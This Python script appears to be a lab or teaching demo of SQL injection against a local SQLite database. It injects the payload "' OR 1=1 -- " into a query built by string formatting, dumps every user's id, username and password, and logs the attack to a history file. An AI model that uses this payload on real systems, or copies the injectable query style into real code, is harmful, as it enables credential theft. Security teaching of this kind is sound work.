#!/usr/bin/env python3
import sqlite3
import os
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

DB_PATH = os.path.join(BASE_DIR, "crte.db")
HISTORY_PATH = os.path.join(BASE_DIR, "attack-history-db.txt")

def logAttack(description):
    os.makedirs(os.path.dirname(HISTORY_PATH), exist_ok=True)
    with open(HISTORY_PATH, "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{timestamp}|Attacker|SQL Injection|{description}\n")


def runSQLInjection():
    print("\n--- Executing SQL Injection Attack (SQLite) ---\n")
    print(f"[DEBUG] Using database: {DB_PATH}")

    if not os.path.exists(DB_PATH):
        print(f"[ERROR] Database not found at: {DB_PATH}")
        print("Make sure the project structure is intact and crte.db exists.")
        return

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    inj_username = "' OR 1=1 -- "
    inj_password = ""

    print("[ATTACK] SQLi payload:")
    print(f"  username = {inj_username}")
    print(f"  password = {inj_password}\n")

    vulnerable_query = (
        "SELECT id, username, password FROM users "
        f"WHERE username='{inj_username}' AND password='{inj_password}';"
    )

    print("[DEBUG] Running vulnerable query:")
    print(vulnerable_query + "\n")

    try:
        cur.execute(vulnerable_query)
        rows = cur.fetchall()

        print("[RESULT] Users Dumped via SQL Injection:")
        print("--------------------------------------------")
        if not rows:
            print("(No user rows returned – table might be empty)")
        else:
            for row in rows:
                user_id, username, password = row
                print(f"ID: {user_id} | Username: {username} | Password: {password}")

        logAttack("SQLite SQL injection – dumped all users")

    except Exception as e:
        print("[ERROR] SQL Injection failed:")
        print(str(e))
        logAttack(f"ERROR: {e}")

    finally:
        conn.close()
        print("\n[INFO] SQLite connection closed\n")


if __name__ == "__main__":
    runSQLInjection()
